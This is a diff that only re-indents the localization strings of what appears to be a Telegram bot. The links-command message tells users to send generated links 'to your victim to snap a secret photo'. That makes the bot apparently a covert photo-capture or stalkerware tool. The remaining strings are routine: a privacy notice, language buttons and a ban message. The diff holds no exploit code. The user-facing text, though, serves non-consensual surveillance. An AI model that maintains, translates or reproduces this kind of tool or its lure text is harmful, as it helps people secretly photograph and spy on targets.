@@ -1,7 +1,7 @@
 -accept-policy-message = <i>By using this bot, you agree to our /privacy policy!</i>
 
 start-command =
-	.description = Getting started
+    .description = Getting started
     .message =
         { -accept-policy-message }
 
@@ -20,8 +20,8 @@ start-command =
     .chat-button = 💭 Chat
 
 links-command =
-	.description = Obtain your unique links! 📸
-	.message = Send one of the links below to your victim to snap a secret photo 📸
+    .description = Obtain your unique links! 📸
+    .message = Send one of the links below to your victim to snap a secret photo 📸
 
 disable-group-chats-event =
     .message = Unfortunately, I am only available in private chats 🙁
@@ -113,7 +113,7 @@ restrict-command =
         ❌ <b>User has been banned!</b> ❌
 
 language-command =
-	.description = Change the language 🌐
+    .description = Change the language 🌐
     .choose-option-message = 🌐 Select your language:
     .en-button = 🇬🇧 English
     .ru-button = 🇷🇺 Russian
